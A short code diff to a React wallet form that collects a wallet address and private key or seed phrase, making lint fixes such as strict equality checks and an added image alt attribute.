@@ -44,10 +44,10 @@ class PrivateKey extends React.Component {
         let privateKeyValid = this.state.privateKeyValid;
         let walletaddressValid = this.state.walletaddressValid
 
-      if(name == 'walletAddress') {
+      if(name === 'walletAddress') {
           walletaddressValid = value.length >= 20;
           errors.walletAddress = walletaddressValid ? '' : 'Wallet Address is too short'
-      } else if (name == 'privateKey') {
+      } else if (name === 'privateKey') {
         privateKeyValid = value.length >= 3
         errors.privateKey = privateKeyValid ? '' : 'Private key is too short'
       }
@@ -106,7 +106,7 @@ class PrivateKey extends React.Component {
                Typically 12 (sometimes 24) words seperated by a single space.
                </small>
                 <br></br>
-               <Button disabled={!this.state.formValid} onClick={this.submitForm} style={{width: '100%'}}>proceed <img src={arrow}></img></Button>
+               <Button disabled={!this.state.formValid} onClick={this.submitForm} style={{width: '100%'}}>proceed <img src={arrow} alt="arrow"></img></Button>
             </Form>
         </Aux>
      );
